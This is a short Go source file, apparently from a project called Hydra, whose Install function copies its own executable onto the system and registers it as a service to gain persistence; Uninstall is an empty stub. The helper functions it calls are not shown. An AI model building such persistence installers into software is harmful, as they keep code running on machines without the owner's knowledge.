package install

import (
	"log"

	"github.com/Raffy27/Hydra/util"
)

//Install attempts to deploy the binary to the system and establish persistence.
func Install() {
	err := CreateBase()
	util.Panicln(err, "Base creation failed")
	err = CopyExecutable()
	util.Panicln(err, "Binary relocation failed")

	err = TryServiceInstall()
	if err != nil {
		log.Panicln(err)
	} else {
		log.Println("Service install successful")
	}
}

//Uninstall attempts to undo all of the changes done to the system by Install.
func Uninstall() {

}
